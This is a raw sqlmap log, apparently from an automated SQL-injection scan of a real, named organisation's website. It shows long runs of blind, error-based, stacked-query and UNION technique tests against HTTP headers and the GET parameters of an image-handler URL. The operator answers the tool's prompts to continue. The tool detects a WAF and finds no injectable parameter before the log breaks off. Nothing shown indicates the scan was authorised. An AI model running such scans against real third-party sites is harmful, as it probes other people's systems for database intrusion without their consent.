[11:53:50] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[11:54:20] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[11:54:44] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[11:54:57] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[11:54:57] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[11:54:58] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[11:54:58] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[11:54:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:55:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[11:56:35] [WARNING] parameter 'User-Agent' does not seem to be injectable
[11:56:35] [INFO] testing if parameter 'Referer' is dynamic
[11:56:36] [WARNING] parameter 'Referer' does not appear to be dynamic
[11:56:36] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[11:56:36] [INFO] testing for SQL injection on parameter 'Referer'
[11:56:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:57:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[11:57:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[11:58:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:58:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:59:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:59:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[12:00:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[12:00:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:00:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[12:00:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[12:00:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[12:00:04] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[12:00:04] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[12:00:36] [INFO] testing 'Generic inline queries'
[12:00:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[12:00:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[12:01:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[12:01:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[12:01:32] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[12:01:32] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[12:01:32] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[12:01:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[12:01:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[12:01:34] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[12:01:50] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[12:02:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:02:43] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[12:03:03] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[12:03:03] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[12:03:03] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[12:03:04] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[12:03:05] [INFO] testing 'PostgreSQL inline queries'
[12:03:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:03:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[12:03:53] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[12:04:02] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[12:04:21] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[12:04:44] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[12:04:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:05:41] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[12:06:18] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[12:06:28] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[12:06:46] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[12:07:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[12:07:25] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[12:07:58] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[12:08:18] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[12:08:18] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[12:08:18] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[12:08:19] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[12:08:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:09:03] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[12:10:03] [WARNING] parameter 'Referer' does not seem to be injectable
[12:10:03] [INFO] testing if parameter 'Host' is dynamic
[12:10:03] [WARNING] parameter 'Host' does not appear to be dynamic
[12:10:04] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[12:10:04] [INFO] testing for SQL injection on parameter 'Host'
[12:10:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:11:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[12:12:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[12:12:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[12:13:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[12:14:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[12:14:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[12:14:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[12:15:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:15:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[12:15:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[12:15:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[12:15:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[12:15:13] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[12:15:42] [INFO] testing 'Generic inline queries'
[12:15:42] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[12:16:28] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[12:17:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[12:17:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[12:17:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[12:17:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[12:17:27] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[12:17:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[12:17:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[12:17:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[12:17:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[12:18:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:18:37] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[12:18:52] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[12:18:52] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[12:18:52] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[12:19:07] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[12:19:08] [INFO] testing 'PostgreSQL inline queries'
[12:19:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:19:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[12:19:43] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[12:19:58] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[12:20:33] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[12:20:49] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[12:21:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:21:48] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[12:22:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[12:22:36] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[12:22:55] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[12:23:41] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[12:24:03] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[12:24:36] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[12:24:55] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[12:24:55] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[12:24:56] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[12:24:56] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[12:24:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:25:08] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[12:25:28] [WARNING] parameter 'Host' does not seem to be injectable
[12:25:28] [ERROR] all tested parameters do not appear to be injectable, skipping to the next target
[12:25:28] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 73 times, 404 (Not Found) - 14 times, 400 (Bad Request) - 1546 times
[5/5] URL:
GET https://www.mustso.org.tr/DesktopModules/SimpleGallery/ImageHandler.ashx?width=200&height=200&HomeDirectory=/Portals/348/Gallery/Album/1161&fileName=1.jpg&portalid=348&i=19935&q=1&s=1
do you want to test this URL? [Y/n/q]
> y
[12:26:05] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/SimpleGallery/ImageHandler.ashx?width=200&height=200&HomeDirectory=/Portals/348/Gallery/Album/1161&fileName=1.jpg&portalid=348&i=19935&q=1&s=1'
you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=gtd-sr_v2AE...mMTFkMTE40'). Do you want to use those [Y/n] y
[12:26:07] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[12:26:07] [INFO] testing if the target URL content is stable
[12:26:08] [INFO] target URL content is stable
[12:26:08] [INFO] testing if GET parameter 'width' is dynamic
[12:26:08] [INFO] GET parameter 'width' appears to be dynamic
[12:26:09] [WARNING] heuristic (basic) test shows that GET parameter 'width' might not be injectable
[12:26:09] [INFO] testing for SQL injection on GET parameter 'width'
[12:26:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:26:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[12:27:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[12:28:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[12:29:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[12:30:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[12:30:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[12:30:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[12:30:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:30:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[12:30:41] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[12:30:41] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[12:30:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[12:30:42] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[12:31:20] [INFO] testing 'Generic inline queries'
[12:31:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[12:32:15] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[12:32:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[12:32:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[12:32:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[12:32:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[12:32:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[12:32:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[12:32:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[12:32:57] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[12:33:36] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[12:34:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:34:31] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[12:34:45] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[12:34:46] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[12:34:46] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[12:34:47] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[12:34:47] [INFO] testing 'PostgreSQL inline queries'
[12:34:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:34:48] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[12:35:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[12:35:33] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[12:35:48] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[12:36:11] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[12:36:36] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[12:36:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:37:31] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[12:38:18] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[12:38:38] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[12:38:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[12:39:20] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[12:39:44] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[12:39:55] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[12:40:18] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[12:40:19] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[12:40:19] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[12:40:20] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[13:13:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:14:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[13:14:11] [WARNING] GET parameter 'width' does not seem to be injectable
[13:14:11] [INFO] testing if GET parameter 'height' is dynamic
[13:14:11] [INFO] GET parameter 'height' appears to be dynamic
[13:14:12] [WARNING] heuristic (basic) test shows that GET parameter 'height' might not be injectable
[13:14:13] [INFO] testing for SQL injection on GET parameter 'height'
[13:14:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:15:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:16:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[13:16:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:18:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:18:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[13:18:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[13:18:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[13:18:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:18:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[13:18:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[13:18:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[13:18:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[13:18:57] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[13:19:28] [INFO] testing 'Generic inline queries'
[13:19:28] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[13:20:29] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[13:21:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[13:21:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[13:21:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[13:21:01] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[13:21:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[13:21:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[13:21:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[13:21:25] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[13:21:48] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[13:22:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:22:51] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[13:23:27] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[13:23:27] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[13:23:28] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[13:23:28] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[13:23:29] [INFO] testing 'PostgreSQL inline queries'
[13:23:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:23:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[13:23:59] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[13:24:06] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[13:24:26] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[13:24:35] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[13:24:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:25:36] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[13:26:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[13:26:41] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[13:26:53] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[13:27:40] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[13:28:10] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[13:28:22] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[13:28:56] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[13:28:57] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[13:28:57] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[13:28:57] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[13:28:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:29:18] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[13:29:36] [WARNING] GET parameter 'height' does not seem to be injectable
[13:29:36] [INFO] testing if GET parameter 'HomeDirectory' is dynamic
[13:29:37] [WARNING] GET parameter 'HomeDirectory' does not appear to be dynamic
[13:29:37] [WARNING] heuristic (basic) test shows that GET parameter 'HomeDirectory' might not be injectable
[13:29:38] [INFO] testing for SQL injection on GET parameter 'HomeDirectory'
[13:29:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:30:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:31:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[13:32:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:33:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:34:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[13:34:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[13:34:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[13:34:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:34:41] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[13:34:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[13:34:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[13:34:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[13:34:45] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[13:35:41] [INFO] testing 'Generic inline queries'
[13:35:41] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[13:37:08] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[13:38:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[13:38:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[13:38:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[13:38:55] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[13:38:56] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[13:39:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[13:39:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[13:39:08] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[13:39:57] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[13:40:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:40:49] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[13:41:10] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[13:41:10] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[13:41:10] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[13:41:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[13:41:12] [INFO] testing 'PostgreSQL inline queries'
[13:41:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:42:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[13:42:31] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[13:42:48] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[13:43:01] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[13:43:11] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[13:43:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:44:11] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[13:44:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[13:44:56] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[13:45:38] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[13:46:11] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[13:46:44] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[13:47:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[13:47:29] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[13:47:29] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[13:47:29] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[13:47:38] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[13:47:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:47:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[13:48:10] [WARNING] GET parameter 'HomeDirectory' does not seem to be injectable
[13:48:10] [INFO] testing if GET parameter 'fileName' is dynamic
[13:48:10] [WARNING] GET parameter 'fileName' does not appear to be dynamic
[13:48:10] [WARNING] heuristic (basic) test shows that GET parameter 'fileName' might not be injectable
[13:48:11] [INFO] testing for SQL injection on GET parameter 'fileName'
[13:48:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:49:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:50:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[13:51:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:52:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:53:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[13:53:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[13:53:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[13:54:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:54:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[13:54:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[13:54:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[13:54:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[13:54:03] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[13:54:50] [INFO] testing 'Generic inline queries'
[13:54:50] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[13:56:02] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[13:56:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[13:56:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[13:56:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[13:56:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[13:56:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[13:57:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[13:57:01] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[13:57:10] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[13:57:42] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[13:58:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:58:29] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[13:58:49] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[13:58:49] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[13:58:49] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[13:58:50] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[13:58:50] [INFO] testing 'PostgreSQL inline queries'
[13:58:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:59:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[14:00:04] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[14:00:19] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[14:00:46] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
